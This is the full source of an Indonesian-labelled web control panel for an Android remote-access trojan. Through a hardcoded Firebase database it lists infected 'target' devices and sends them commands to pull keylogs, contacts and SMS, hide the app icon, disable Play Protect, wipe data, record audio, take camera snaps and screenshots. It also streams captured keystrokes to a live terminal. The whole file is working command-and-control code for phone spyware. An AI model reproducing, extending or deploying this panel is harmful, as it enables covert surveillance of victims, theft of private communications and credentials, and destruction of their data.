<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZETA ULTIMATE CONTROL V3.5</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #05070a; --card: #111827; --accent: #3b82f6; --text: #f3f4f6; --green: #10b981; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        #sidebar { background: #000; width: 100%; padding: 15px; border-bottom: 2px solid var(--accent); overflow-y: auto; }
        .brand { color: var(--accent); font-weight: 900; font-size: 20px; margin-bottom: 15px; text-align: center; }
        
        /* Device List Styling */
        #device-list { display: flex; flex-direction: column; gap: 10px; }
        .dev-item { 
            background: var(--card); padding: 15px; border-radius: 10px; 
            cursor: pointer; border: 2px solid #1f2937; transition: 0.3s; 
            position: relative; overflow: hidden;
        }
        .dev-item:hover { background: #1f2937; border-color: var(--gray); }
        .dev-item.active { border-color: var(--accent); background: #1e3a8a; box-shadow: 0 0 15px rgba(59, 130, 246, 0.4); }
        .dev-item b { font-size: 14px; display: block; margin-bottom: 4px; color: #fff; }
        .dev-item small { font-size: 11px; color: #9ca3af; font-family: monospace; }
        
        /* Main Content */
        main { flex: 1; padding: 20px; overflow-y: auto; background: #080c14; }
        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
        .card { background: var(--card); padding: 15px; border-radius: 12px; border: 1px solid #1f2937; margin-bottom: 20px; }
        .label { font-size: 11px; font-weight: 800; color: #6b7280; text-transform: uppercase; margin-bottom: 12px; display: block; border-left: 3px solid var(--accent); padding-left: 8px; }
        
        /* Buttons */
        button { background: #374151; color: white; border: none; padding: 12px 5px; border-radius: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.2s; }
        button:hover { background: #4b5563; filter: brightness(1.2); }
        button:active { transform: translateY(2px); }
        .btn-danger { background: #b91c1c; }
        .btn-safe { background: #059669; }

        /* Terminal */
        #terminal { background: #000; color: var(--green); padding: 15px; height: 250px; border-radius: 8px; font-family: 'Consolas', monospace; overflow-y: auto; font-size: 12px; border: 1px solid #374151; line-height: 1.6; }
        .log-entry { border-bottom: 1px solid #111; padding: 4px 0; }

        @media (min-width: 768px) {
            body { flex-direction: row; }
            #sidebar { width: 320px; height: 100vh; border-bottom: none; border-right: 1px solid #1f2937; }
        }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="brand">ZETA ULTIMATE</div>
    <span class="label">Target Terdeteksi</span>
    <div id="device-list">Mencari perangkat...</div>
</div>

<main>
    <div id="no-selection" style="text-align: center; margin-top: 100px; color: #4b5563;">
        <h2>âš ï¸ Perangkat Belum Dipilih</h2>
        <p>Silakan klik pada salah satu list perangkat di sebelah kiri/atas.</p>
    </div>

    <div id="panel-control" style="display:none;">
        <div class="card">
            <span class="label">ğŸ•¹ï¸ Navigasi & Sistem</span>
            <div class="grid-container">
                <button onclick="sendCmd('home')">ğŸ  HOME</button>
                <button onclick="sendCmd('back')">â¬…ï¸ BACK</button>
                <button onclick="sendCmd('recents')">ğŸ“‘ RECENTS</button>
                <button onclick="sendCmd('notif_bar')">ğŸ”” NOTIF BAR</button>
                <button onclick="sendCmd('quick_settings')">âš™ï¸ QUICK SET</button>
                <button onclick="sendCmd('lock_screen')">ğŸ”’ LOCK SCREEN</button>
                <button onclick="sendCmd('power_dialog')">ğŸ”‹ POWER DIALOG</button>
            </div>
        </div>

        <div class="card">
            <span class="label">ğŸ”Š Media & Volume</span>
            <div class="grid-container">
                <button onclick="sendCmd('vol_up')">ğŸ”Š VOL UP</button>
                <button onclick="sendCmd('vol_down')">ğŸ”‰ VOL DOWN</button>
                <button onclick="sendCmd('vol_mute')">ğŸ”‡ MUTE</button>
                <button onclick="sendCmd('play_pause')">â¯ï¸ PLAY/PAUSE</button>
                <button onclick="sendCmd('next_track')">â­ï¸ NEXT</button>
                <button onclick="sendCmd('prev_track')">â®ï¸ PREV</button>
                <button onclick="sendCmd('brightness_up')">â˜€ï¸ BRIGHT UP</button>
                <button onclick="sendCmd('brightness_down')">ğŸŒ™ BRIGHT DOWN</button>
            </div>
        </div>

        <div class="card">
            <span class="label">ğŸ“‚ Data & Aplikasi</span>
            <div class="grid-container">
                <button class="btn-safe" onclick="sendCmd('get_logs')">ğŸ“¥ AMBIL KEYLOG</button>
                <button class="btn-safe" onclick="sendCmd('get_contact')">ğŸ‘¤ GET CONTACT</button>
                <button class="btn-safe" onclick="sendCmd('get_sms')">ğŸ’¬ GET SMS</button>
                <button onclick="sendCmd('open_wa')">ğŸŸ¢ OPEN WA</button>
                <button onclick="sendCmd('open_fb')">ğŸ”µ OPEN FB</button>
                <button onclick="sendCmd('open_ig')">ğŸŸ£ OPEN IG</button>
                <button onclick="sendCmd('open_yt')">ğŸ”´ OPEN YT</button>
                <button onclick="sendCmd('open_chrome')">ğŸŒ CHROME</button>
                <button onclick="sendCmd('vibrate')">ğŸ“³ VIBRATE</button>
                <button onclick="sendCmd('flashlight')">ğŸ”¦ FLASHLIGHT</button>
            </div>
        </div>

        <div class="card">
            <span class="label">ğŸ›¡ï¸ Keamanan & Eksekusi</span>
            <div class="grid-container">
                <button class="btn-danger" onclick="sendCmd('hide_icon')">ğŸ‘» HIDE ICON</button>
                <button class="btn-danger" onclick="sendCmd('show_icon')">ğŸ‘ï¸ SHOW ICON</button>
                <button class="btn-danger" onclick="sendCmd('kill_app')">ğŸ’€ KILL APP</button>
                <button class="btn-danger" onclick="sendCmd('wipe_data')">ğŸ§¹ WIPE DATA</button>
                <button class="btn-danger" onclick="sendCmd('disable_playprotect')">ğŸ›¡ï¸ OFF PROTECT</button>
                <button onclick="sendCmd('screenshot')">ğŸ“¸ SCREENSHOT</button>
                <button onclick="sendCmd('record_audio')">ğŸ™ï¸ REC AUDIO</button>
                <button onclick="sendCmd('camera_snap')">ğŸ“· CAM SNAP</button>
                <button class="btn-danger" onclick="clearLogsData()">ğŸ—‘ï¸ CLEAR DB LOGS</button>
                <button onclick="location.reload()">ğŸ”„ REFRESH PANEL</button>
            </div>
        </div>

        <div class="card">
            <span class="label">âŒ¨ï¸ Live Keylogs Terminal</span>
            <div id="terminal">Menunggu perintah...</div>
        </div>
    </div>
</main>

<script>
    // KONFIGURASI FIREBASE
    const firebaseConfig = {
        apiKey: "AIzaSyDrpBJTtankyLgimtOwuriFpiyuC5K10OI",
        authDomain: "studio-727777898-40aea.firebaseapp.com",
        databaseURL: "https://studio-727777898-40aea-default-rtdb.firebaseio.com",
        projectId: "studio-727777898-40aea",
        storageBucket: "studio-727777898-40aea.firebasestorage.app",
        messagingSenderId: "351263967108",
        appId: "1:351263967108:web:973eb49037d874e5c17fd1",
        measurementId: "G-C1LTN3E50Q"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedId = "";

    // MENGAMBIL LIST PERANGKAT
    db.ref('daftar_perangkat').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        
        if(!snap.exists()) {
            list.innerHTML = "<div style='color:gray;padding:10px;'>Tidak ada perangkat online.</div>";
            return;
        }

        snap.forEach(child => {
            const id = child.key;
            const data = child.val().info || {};
            const model = data.model || "Unknown Device";
            
            const div = document.createElement('div');
            div.className = `dev-item ${selectedId === id ? 'active' : ''}`;
            div.innerHTML = `<b>ğŸ“± ${model}</b><small>ID: ${id}</small>`;
            
            // FITUR KLIK PERBAIKAN
            div.onclick = function() {
                handleDeviceSelection(id);
            };
            
            list.appendChild(div);
        });
    });

    function handleDeviceSelection(id) {
        selectedId = id;
        
        // Tampilkan UI Control
        document.getElementById('no-selection').style.display = 'none';
        document.getElementById('panel-control').style.display = 'block';
        
        // Update styling di sidebar
        const items = document.querySelectorAll('.dev-item');
        items.forEach(item => {
            if(item.innerHTML.includes(id)) {
                item.classList.add('active');
            } else {
                item.classList.remove('active');
            }
        });

        // Hubungkan ke Log
        listenToLiveLogs(id);
    }

    function sendCmd(commandName) {
        if(!selectedId) {
            alert("Pilih perangkat terlebih dahulu!");
            return;
        }
        db.ref(`daftar_perangkat/${selectedId}`).update({
            command: commandName,
            time: Date.now()
        }).then(() => {
            console.log("Sent: " + commandName);
        });
    }

    function listenToLiveLogs(id) {
        const term = document.getElementById('terminal');
        db.ref(`daftar_perangkat/${id}/keylogs`).limitToLast(30).on('value', snap => {
            term.innerHTML = "";
            if(!snap.exists()) {
                term.innerHTML = "<div style='color:#4b5563'>Belum ada data log dari perangkat ini.</div>";
                return;
            }
            snap.forEach(child => {
                const data = child.val();
                const time = new Date(data.time).toLocaleTimeString();
                term.innerHTML += `<div class="log-entry"><span style="color:#3b82f6">[${time}]</span> ${data.text}</div>`;
            });
            term.scrollTop = term.scrollHeight;
        });
    }

    function clearLogsData() {
        if(selectedId && confirm("Hapus semua log di database untuk perangkat ini?")) {
            db.ref(`daftar_perangkat/${selectedId}/keylogs`).remove();
        }
    }
</script>
</body>
</html>
